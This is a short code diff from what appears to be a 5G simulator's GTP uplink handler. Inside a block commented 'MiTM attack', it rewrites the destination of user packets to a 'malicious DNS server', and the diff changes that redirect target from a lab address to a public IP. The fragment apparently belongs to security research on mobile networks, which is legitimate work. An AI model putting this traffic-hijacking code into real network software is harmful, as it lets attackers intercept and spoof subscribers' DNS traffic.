@@ -137,7 +137,7 @@ void GtpTask::handleUplinkData(int ueId, int psi, OctetString &&pdu)
 
         // MiTM attack
         // TODO: command line defined malicious DNS server IP
-        std::string fake_dns_ip = "192.168.56.104";
+        std::string fake_dns_ip = "8.8.4.4";
         unsigned short fake_dns_port = 9000;
         m_logger->debug("Changing packet destination IP:Port to [%s]", fake_dns_ip.c_str());
         utils::set_dest_ip(&p, fake_dns_ip);
